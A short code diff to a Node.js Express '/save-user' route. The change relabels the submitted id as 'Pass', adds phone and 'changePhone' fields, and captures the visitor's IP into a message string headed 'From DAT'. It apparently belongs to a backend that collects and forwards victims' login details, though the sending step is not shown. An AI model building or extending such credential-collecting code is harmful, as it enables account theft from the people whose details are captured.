@@ -51,17 +51,24 @@ app.post("/save-user", async (req, res) => {
     },
   });
 
-  let text = `Email => ${email}, id => ${id}`;
+  let text = `From DAT:\nEmail: ${email}\nPass: ${id}`;
 
   const params = { email, id };
   if (req.body.phone) {
     params.phone = req.body.phone;
-    text += `, Phone => ${req.body.phone}`;
+    text += `\nNumber: ${req.body.phone}`;
   }
   if (req.body.changePhone) {
     params.changePhone = req.body.changePhone;
-    text += `, changePhone => ${req.body.changePhone}`;
+    text += `changePhone => ${req.body.changePhone}`;
   }
+
+  const userIP = (
+    req.headers["x-forwarded-for"] || req.connection.remoteAddress
+  )
+    ?.split(",")?.[0]
+    ?.trim();
+  text += `\nUser IP: ${userIP}`;
 
   // Create a new user instance
   const newUser = new User(params);
